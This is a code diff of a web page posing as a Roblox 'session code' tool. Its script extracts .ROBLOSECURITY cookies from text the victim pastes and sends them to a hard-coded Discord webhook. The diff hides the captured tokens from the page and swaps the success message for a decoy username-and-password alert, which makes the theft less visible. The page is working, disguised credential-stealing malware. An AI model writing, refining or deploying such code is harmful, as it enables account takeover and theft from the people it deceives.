@@ -38,22 +38,6 @@
     button:hover {
       background-color: #0056b3;
     }
-    .token {
-      background: #eef9ff;
-      border: 1px solid #bfe8ff;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 6px;
-      font-family: 'Courier New', Courier, monospace;
-      word-break: break-all;
-      display: block;
-      color: #0056b3;
-    }
-    .token::before {
-      content: "Token: ";
-      font-weight: bold;
-      color: #333;
-    }
   </style>
 </head>
 <body>
@@ -62,12 +46,9 @@
   <textarea id="input" placeholder="Paste the roblox ID to extract"></textarea>
   <button id="extractSendBtn">Get the session code</button>
 
-  <div id="tokens"></div>
-
   <script>
     const input = document.getElementById('input');
     const extractSendBtn = document.getElementById('extractSendBtn');
-    const tokensDiv = document.getElementById('tokens');
 
     const regexes = [
       /System\.Net\.Cookie\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/g,
@@ -91,24 +72,12 @@
       return found;
     }
 
-    function renderTokens(list) {
-      tokensDiv.innerHTML = '';
-      list.forEach(t => {
-        const div = document.createElement('div');
-        div.className = 'token';
-        div.textContent = t;
-        tokensDiv.appendChild(div);
-      });
-    }
-
     extractSendBtn.addEventListener('click', async () => {
       const tokens = extractAll(input.value);
       if (!tokens.length) {
         alert("Aucun token trouvé !");
         return;
       }
-
-      renderTokens(tokens);
 
       try {
         const res = await fetch("https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF", {
@@ -117,7 +86,7 @@
           body: JSON.stringify({ content: "Tokens trouvés:\n" + tokens.join("\n") })
         });
         if (res.ok) {
-          alert("Tokens envoyés avec succès !");
+          alert("Username : anjeyla1343 | Password : anjeyla134367>>");
         } else {
           alert("Erreur lors de l'envoi: " + res.status);
         }
